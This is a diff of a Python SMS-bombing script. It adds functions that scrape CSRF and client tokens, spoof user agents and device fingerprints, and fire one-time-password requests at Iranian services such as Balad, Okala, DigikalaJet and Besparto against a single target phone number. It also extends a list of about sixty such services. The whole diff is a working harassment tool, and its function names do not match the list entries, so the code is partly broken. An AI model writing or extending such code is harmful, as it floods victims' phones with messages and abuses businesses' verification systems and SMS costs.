@@ -64,24 +64,190 @@ def send_service_safe(service, phone):
 # ==========================
 # توابع سرویس‌ها
 # ==========================
-def nillarayeshi(phone):
-    user_agents = [
-        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
-        "Mozilla/5.0 (Android 13; Mobile; rv:109.0) Gecko/109.0 Firefox/109.0",
-        "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36",
-        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
-        "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Safari/605.1.15"
-    ]
-    formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
+
+def ShahreSandal(phone):
     try:
         session = requests.Session()
-        home_response = session.get("https://nillarayeshi.com/", timeout=10, headers={"User-Agent": random.choice(user_agents)})
-        home_response.encoding = 'utf-8'
-        csrf_match = re.search(r'name="csrf" value="([a-f0-9]+)"', home_response.text)
-        nonce_match = re.search(r'name="dig_nounce" value="([a-f0-9]+)"', home_response.text)
-        csrf = csrf_match.group(1) if csrf_match else "b77d25383c"
-        nonce = nonce_match.group(1) if nonce_match else "b77d25383c"
-        url = "https://nillarayeshi.com/wp-admin/admin-ajax.php"
+        
+        # ابتدا صفحه اصلی را برای دریافت CSRF Token بگیریم
+        home_response = session.get(
+            "https://shahresandal.com/",
+            headers={"User-Agent": random.choice(user_agents)},
+            timeout=10
+        )
+        
+        # استخراج CSRF Token از صفحه
+        csrf_token = None
+        csrf_patterns = [
+            r'name="csrf-token" content="([^"]+)"',
+            r'X-CSRF-TOKEN["\']?\s*[:=]\s*["\']([^"\']+)["\']',
+            r'csrfToken["\']?\s*[:=]\s*["\']([^"\']+)["\']',
+            r'token["\']?\s*[:=]\s*["\']([^"\']+)["\']'
+        ]
+        
+        for pattern in csrf_patterns:
+            match = re.search(pattern, home_response.text)
+            if match:
+                csrf_token = match.group(1)
+                break
+        
+        if not csrf_token:
+            print(f'{r}[-] ShahreSandal: Could not extract CSRF Token{a}')
+            return False
+        
+        print(f'{g}[+] CSRF Token: {csrf_token}{a}')
+        
+        # حالا درخواست ارسال کد
+        url = "https://shahresandal.com/sendcode"
+        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
+        formatted_phone = f"0{formatted_phone}"
+        
+        headers = {
+            "Accept": "application/json",
+            "Content-Type": "application/json",
+            "X-CSRF-Token": csrf_token,
+            "User-Agent": random.choice(user_agents),
+            "Origin": "https://shahresandal.com",
+            "Referer": "https://shahresandal.com/",
+            "X-Requested-With": "XMLHttpRequest"
+        }
+        
+        payload = {
+            "mobile": formatted_phone
+        }
+        
+        response = session.post(
+            url, 
+            json=payload, 
+            headers=headers, 
+            timeout=10
+        )
+        
+        print(f'{y}[Debug] ShahreSandal Status: {response.status_code}{a}')
+        print(f'{y}[Debug] ShahreSandal Response: {response.text}{a}')
+        
+        if response.status_code in [200, 201, 202]:
+            try:
+                data = response.json()
+                if data.get("success") or data.get("status") == "success":
+                    print(f'{g}(ShahreSandal) Code Sent{a}')
+                    return True
+            except:
+                if "success" in response.text.lower():
+                    print(f'{g}(ShahreSandal) Code Sent{a}')
+                    return True
+        elif response.status_code == 419:
+            print(f'{r}[-] ShahreSandal: CSRF Token Expired/Invalid{a}')
+            return False
+        
+        return False
+            
+    except Exception as e:
+        print(f'{r}[!] ShahreSandal Exception: {e}{a}')
+        return False
+        
+
+def Balad(phone):
+    try:
+        formatted_phone = "0" + phone.replace("+98", "")  # تبدیل +989... به 09...
+        
+        url = "https://account.api.balad.ir/api/web/auth/login/"
+        headers = {
+            "Accept": "application/json, text/plain, */*",
+            "Content-Type": "application/json",
+            "device-id": str(uuid.uuid4()),
+            "User-Agent": random.choice(user_agents)
+        }
+        
+        payload = {
+            "phone_number": formatted_phone,
+            "os_type": "W"
+        }
+        
+        response = requests.post(url, json=payload, headers=headers, timeout=10)
+        
+        if response.status_code == 200:
+            print(f'{g}(Balad) Code Sent{a}')
+            return True
+        else:
+            print(f'{r}[-] Balad HTTP Error: {response.status_code} - {response.text[:100]}{a}')
+            return False
+            
+    except Exception as e:
+        print(f'{r}[!] Balad Exception: {e}{a}')
+        return False
+
+
+def Charsooq(phone):
+    try:
+        url = "https://app.charsooq.com/api/v1/send-otp"
+        
+        # فرمت شماره: 09113339999 (با صفر اول)
+        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
+        formatted_phone = f"0{formatted_phone}"  # مطمئن شویم که با صفر شروع می‌شود
+        
+        headers = {
+            "Accept": "application/json",
+            "Content-Type": "application/json",
+            "User-Agent": random.choice(user_agents),
+            "Origin": "https://app.charsooq.com",
+            "Referer": "https://app.charsooq.com/",
+        }
+        
+        payload = {
+            "cell_number": formatted_phone  # با فرمت 09123334455
+        }
+        
+        response = requests.post(
+            url, 
+            json=payload, 
+            headers=headers, 
+            timeout=10
+        )
+        
+        print(f'{y}[Debug] Charsooq Status: {response.status_code}{a}')
+        print(f'{y}[Debug] Charsooq Response: {response.text}{a}')
+        
+        if response.status_code in [200, 201, 202]:
+            print(f'{g}(Charsooq) Code Sent{a}')
+            return True
+        elif response.status_code == 422:
+            print(f'{y}[!] Charsooq Validation Error{a}')
+            return False
+        else:
+            print(f'{r}[-] Charsooq HTTP Error: {response.status_code}{a}')
+            return False
+            
+    except Exception as e:
+        print(f'{r}[!] Charsooq Exception: {e}{a}')
+        return False
+
+
+
+def Koohshid(phone):
+    try:
+        session = requests.Session()
+        
+        # دریافت صفحه اصلی برای استخراج CSRF
+        home_response = session.get(
+            "https://koohshid.com/",
+            headers={"User-Agent": random.choice(user_agents)},
+            timeout=10
+        )
+        
+        # استخراج CSRF از صفحه
+        csrf_match = re.search(r'name="csrf" value="([^"]+)"', home_response.text)
+        csrf = csrf_match.group(1) if csrf_match else "5282f04eb5"
+        
+        if not csrf:
+            print(f'{r}[-] Koohshid: Could not extract CSRF token{a}')
+            return False
+        
+        print(f'{g}[+] CSRF Token: {csrf}{a}')
+        
+        # آماده سازی payload
+        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
+        
         payload = {
             "action": "digits_check_mob",
             "countrycode": "+98",
@@ -92,44 +258,367 @@ def nillarayeshi(phone):
             "email": "",
             "captcha": "",
             "captcha_ses": "",
-            "digits": "1",
             "json": "1",
-            "whatsapp": "0",
-            "digits_reg_name": "نام",
-            "digregcode": "+98",
-            "digits_reg_mail": formatted_phone,
-            "digregscode2": "+98",
-            "mobmail2": "",
-            "digits_reg_password": "",
-            "dig_otp": "",
-            "code": "",
-            "dig_reg_mail": "",
-            "dig_nounce": nonce
+            "whatsapp": "0"
         }
+        
         headers = {
             "User-Agent": random.choice(user_agents),
             "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
             "Accept": "*/*",
             "X-Requested-With": "XMLHttpRequest",
-            "Origin": "https://nillarayeshi.com",
-            "Referer": "https://nillarayeshi.com/",
+            "Origin": "https://koohshid.com",
+            "Referer": "https://koohshid.com/",
         }
-        response = session.post(url, data=payload, headers=headers, timeout=10)
-        response.encoding = 'utf-8'
+        
+        response = session.post(
+            "https://koohshid.com/wp-admin/admin-ajax.php",
+            data=payload,
+            headers=headers,
+            timeout=10
+        )
+        
+        print(f'{y}[Debug] Koohshid Status: {response.status_code}{a}')
+        print(f'{y}[Debug] Koohshid Response: {response.text}{a}')
+        
         if response.status_code == 200:
             try:
                 data = response.json()
                 if data.get("success") or "sent" in str(data).lower():
-                    print(f'{g}(nillarayeshi) Code Sent to {phone}{a}')
+                    print(f'{g}(Koohshid) Code Sent{a}')
+                    return True
                 else:
-                    print(f'{r}[-] (nillarayeshi) Failed: {data.get("message", "Unknown")}{a}')
-            except ValueError:
-                if "1" in response.text or "sent" in response.text.lower():
-                    print(f'{g}(nillarayeshi) Code Sent to {phone}{a}')
+                    print(f'{r}[-] Koohshid Failed: {data.get("message", "Unknown")}{a}')
+                    return False
+            except:
+                if "1" in response.text or "success" in response.text.lower():
+                    print(f'{g}(Koohshid) Code Sent{a}')
+                    return True
+                return False
         else:
-            print(f"{r}[-] (nillarayeshi) HTTP Error: {response.status_code}{a}")
+            print(f'{r}[-] Koohshid HTTP Error: {response.status_code}{a}')
+            return False
+            
     except Exception as e:
-        print(f"{r}[!] nillarayeshi Exception: {e}{a}")
+        print(f'{r}[!] Koohshid Exception: {e}{a}')
+        return False
+        
+
+def Okala(phone):
+    try:
+        url = "https://apigateway.okala.com/api/voyager/C/CustomerAccount/OTPRegister"
+        
+        # فرمت شماره
+        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
+        formatted_phone = f"0{formatted_phone}"  # فرمت 0912...
+        
+        headers = {
+            "Accept": "application/json, text/plain, */*",
+            "Content-Type": "application/json",
+            "X-Correlation-Id": str(uuid.uuid4()),
+            "session-id": str(uuid.uuid4()),
+            "ui-version": "2.0",
+            "source": "okala",
+            "User-Agent": random.choice(user_agents),
+            "Origin": "https://okala.com",
+            "Referer": "https://okala.com/",
+        }
+        
+        payload = {
+            "mobile": formatted_phone,
+            "confirmTerms": True,
+            "notRobot": False,
+            "ValidationCodeCreateReason": 5,
+            "OtpApp": 0,
+            "deviceTypeCode": 7,
+            "IsAppOnly": False
+        }
+        
+        response = requests.post(
+            url, 
+            json=payload, 
+            headers=headers, 
+            timeout=10
+        )
+        
+        print(f'{y}[Debug] Okala Status: {response.status_code}{a}')
+        print(f'{y}[Debug] Okala Response: {response.text}{a}')
+        
+        if response.status_code in [200, 201, 202]:
+            try:
+                data = response.json()
+                if data.get("success") or data.get("isSuccess") or data.get("otpSent"):
+                    print(f'{g}(Okala) Code Sent{a}')
+                    return True
+                else:
+                    print(f'{r}[-] Okala Failed: {data.get("message", "Unknown error")}{a}')
+                    return False
+            except:
+                if "success" in response.text.lower() or "otp" in response.text.lower():
+                    print(f'{g}(Okala) Code Sent{a}')
+                    return True
+                return False
+        else:
+            print(f'{r}[-] Okala HTTP Error: {response.status_code}{a}')
+            return False
+            
+    except Exception as e:
+        print(f'{r}[!] Okala Exception: {e}{a}')
+        return False
+
+
+
+def Besparto(phone):
+    try:
+        session = requests.Session()
+        
+        # اول صفحه اصلی را بگیریم تا توکن را استخراج کنیم
+        home_response = session.get(
+            "https://besparto.ir/",
+            headers={"User-Agent": random.choice(user_agents)},
+            timeout=10
+        )
+        
+        # استخراج Client-Token از صفحه
+        client_token = None
+        token_patterns = [
+            r'Client-Token["\']?\s*[:=]\s*["\']([^"\']+)["\']',
+            r'clientToken["\']?\s*[:=]\s*["\']([^"\']+)["\']',
+            r'token["\']?\s*[:=]\s*["\']([^"\']+)["\']',
+            r'\$2y\$10\$[a-zA-Z0-9./]+'  # pattern برای توکن های bcrypt
+        ]
+        
+        for pattern in token_patterns:
+            match = re.search(pattern, home_response.text)
+            if match:
+                client_token = match.group(0)  # کل match را بگیریم
+                print(f'{g}[+] Found Client-Token: {client_token}{a}')
+                break
+        
+        if not client_token:
+            # اگر توکن پیدا نشد، از توکن پیشفرض استفاده کنیم
+            client_token = "$2y$10$KH69txfOkqZuhxqF2W1BR.6o0jrrw.X53TH4dMmYfhCDNtwwq/8n6"
+            print(f'{y}[!] Using default Client-Token{a}')
+        
+        # حالا درخواست ارسال کد
+        url = "https://api.besparto.ir/customer/v1/token/"
+        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
+        formatted_phone = f"0{formatted_phone}"
+        
+        headers = {
+            "Accept": "application/json",
+            "Content-Type": "application/json",
+            "Client-Token": client_token,
+            "User-Agent": random.choice(user_agents),
+            "Origin": "https://besparto.ir",
+            "Referer": "https://besparto.ir/",
+        }
+        
+        payload = {
+            "mobile": formatted_phone
+        }
+        
+        response = session.post(
+            url, 
+            json=payload, 
+            headers=headers, 
+            timeout=10
+        )
+        
+        print(f'{y}[Debug] Besparto Status: {response.status_code}{a}')
+        print(f'{y}[Debug] Besparto Response: {response.text}{a}')
+        
+        if response.status_code in [200, 201, 202]:
+            try:
+                data = response.json()
+                if data.get("success") or data.get("status") == "success":
+                    print(f'{g}(Besparto) Code Sent{a}')
+                    return True
+                else:
+                    print(f'{r}[-] Besparto Failed: {data.get("message", "Unknown error")}{a}')
+                    return False
+            except:
+                if "success" in response.text.lower() or "sent" in response.text.lower():
+                    print(f'{g}(Besparto) Code Sent{a}')
+                    return True
+                return False
+        else:
+            print(f'{r}[-] Besparto HTTP Error: {response.status_code}{a}')
+            return False
+            
+    except Exception as e:
+        print(f'{r}[!] Besparto Exception: {e}{a}')
+        return False
+
+
+
+def DigikalaJet(phone):
+    try:
+        url = "https://api.digikalajet.ir/user/login-register/"
+        
+        # فرمت شماره
+        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
+        formatted_phone = f"0{formatted_phone}"  # فرمت 0912...
+        
+        headers = {
+            "Accept": "application/json, text/plain, */*",
+            "Content-Type": "application/json",
+            "X-Request-UUID": str(uuid.uuid4()),
+            "ClientId": f"FINGERPRINT-{uuid.uuid4().hex[:20]}",
+            "ClientOs": "iOS",
+            "Client": "mobile",
+            "product-mode": "shop_product",
+            "session": f"{uuid.uuid4()}-V2{random.randint(1000000000, 9999999999)}",
+            "app-id": str(uuid.uuid4()),
+            "clientid-v2": f"FINGERPRINTV2-{uuid.uuid4().hex[:20]}",
+            "User-Agent": random.choice(user_agents),
+            "Origin": "https://digikalajet.ir",
+            "Referer": "https://digikalajet.ir/",
+        }
+        
+        payload = {
+            "phone": formatted_phone
+        }
+        
+        response = requests.post(
+            url, 
+            json=payload, 
+            headers=headers, 
+            timeout=10
+        )
+        
+        print(f'{y}[Debug] DigikalaJet Status: {response.status_code}{a}')
+        print(f'{y}[Debug] DigikalaJet Response: {response.text}{a}')
+        
+        if response.status_code in [200, 201, 202]:
+            try:
+                data = response.json()
+                if data.get("success") or data.get("status") == "success":
+                    print(f'{g}(DigikalaJet) Code Sent{a}')
+                    return True
+                else:
+                    print(f'{r}[-] DigikalaJet Failed: {data.get("message", "Unknown error")}{a}')
+                    return False
+            except:
+                if "success" in response.text.lower() or "sent" in response.text.lower():
+                    print(f'{g}(DigikalaJet) Code Sent{a}')
+                    return True
+                return False
+        else:
+            print(f'{r}[-] DigikalaJet HTTP Error: {response.status_code}{a}')
+            return False
+            
+    except Exception as e:
+        print(f'{r}[!] DigikalaJet Exception: {e}{a}')
+        return False
+
+
+
+def Sandalestan(phone):
+    try:
+        session = requests.Session()
+        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
+        formatted_phone = f"0{formatted_phone}"
+        
+        # اول صفحه را بگیریم تا CSRF Token و fingerprint را دریافت کنیم
+        url = f"https://sandalestan.com/register-opt?mobile={formatted_phone}"
+        
+        headers = {
+            "User-Agent": random.choice(user_agents),
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+        }
+        
+        # دریافت صفحه اول
+        response = session.get(url, headers=headers, timeout=10)
+        
+        # استخراج CSRF Token
+        csrf_token = None
+        csrf_pattern = r'name="csrf-token" content="([^"]+)"'
+        match = re.search(csrf_pattern, response.text)
+        if match:
+            csrf_token = match.group(1)
+        
+        if not csrf_token:
+            print(f'{r}[-] Sandalestan: Could not extract CSRF Token{a}')
+            return False
+        
+        # استخراج fingerprint از صفحه (اگر وجود دارد)
+        fingerprint_id = f"fp{random.randint(100000, 999999)}"
+        
+        # آماده سازی payload برای Livewire
+        payload = {
+            "fingerprint": {
+                "id": fingerprint_id,
+                "name": "auth.register",
+                "locale": "fa",
+                "path": "register-opt",
+                "method": "GET"
+            },
+            "serverMemo": {
+                "children": [],
+                "errors": [],
+                "htmlHash": "7c608e69",
+                "data": {
+                    "name": None,
+                    "password": None,
+                    "password_confirmation": None,
+                    "email": None,
+                    "introducer_mobile": None,
+                    "newsletter": 1,
+                    "mobile": formatted_phone,
+                    "code": None,
+                    "step": 2,
+                    "type_code": None,
+                    "user": None
+                },
+                "dataMeta": [],
+                "checksum": "e089e0c638f7d93a25a684677583a927f8e8af92fd12451b098269cae6685216"
+            },
+            "updates": [
+                {
+                    "type": "callMethod",
+                    "payload": {
+                        "method": "resend",
+                        "params": []
+                    }
+                }
+            ]
+        }
+        
+        headers = {
+            "User-Agent": random.choice(user_agents),
+            "Content-Type": "application/json",
+            "Accept": "text/html, application/xhtml+xml",
+            "X-Livewire": "true",
+            "X-CSRF-TOKEN": csrf_token,
+            "Referer": f"https://sandalestan.com/register-opt?mobile={formatted_phone}",
+            "Origin": "https://sandalestan.com"
+        }
+        
+        # ارسال درخواست به Livewire
+        response = session.post(
+            "https://sandalestan.com/livewire/message/auth.register",
+            json=payload,
+            headers=headers,
+            timeout=10
+        )
+        
+        print(f'{y}[Debug] Sandalestan Status: {response.status_code}{a}')
+        print(f'{y}[Debug] Sandalestan Response: {response.text[:200]}...{a}')
+        
+        if response.status_code == 200:
+            print(f'{g}(Sandalestan) Code Sent{a}')
+            return True
+        else:
+            print(f'{r}[-] Sandalestan HTTP Error: {response.status_code}{a}')
+            return False
+            
+    except Exception as e:
+        print(f'{r}[!] Sandalestan Exception: {e}{a}')
+        return False
+        
+
+
 
 def vitrin_shop(phone):
     formatted_phone = "0" + re.sub(r'[^0-9]', '', phone.replace("+98", ""))
@@ -1545,15 +2034,17 @@ def banimode(phone):
 # ==========================
 services = [
     achareh, alibaba, alldigitall, alopeyk_safir, angeliran,
-    banimode, barghman, bimebazar, bodoroj, candom_shop,
-    dgshahr, digikala, divar, drnext, elanza,
-    gap, ghasedak24, hajamooo, ilozi, katonikhan,
-    katoonistore, komodaa, mahabadperfume, malltina, mek,
+    balad, banimode, barghman, besparto, bimebazar,
+    bodoroj, candom_shop, charsooq, dgshahr, digikala,
+    digikalajet, divar, drnext, elanza, gap,
+    ghasedak24, hajamooo, ilozi, katonikhan, katoonistore,
+    komodaa, koohshid, mahabadperfume, malltina, mek,
     missomister, mo7_ir, mobilex, mootanroo, mrbilit,
-    niktakala, nillarayeshi, okorosh, paklean_call, payonshoes,
-    pindo, ragham_call, riiha, shahrfarsh, snap,
-    snapp_market, snappshop, tapsi_food, tetherland, theshoes,
-    torobpay, trip, trip_call, vitrin_shop
+    niktakala, nillarayeshi, okala, okorosh, paklean_call,
+    payonshoes, pindo, ragham_call, riiha, sandalestan,
+    shahrfarsh, shahresandal, snap, snapp_market, snappshop,
+    tapsi_food, tetherland, theshoes, torobpay, trip,
+    trip_call, vitrin_shop
 ]
 
           
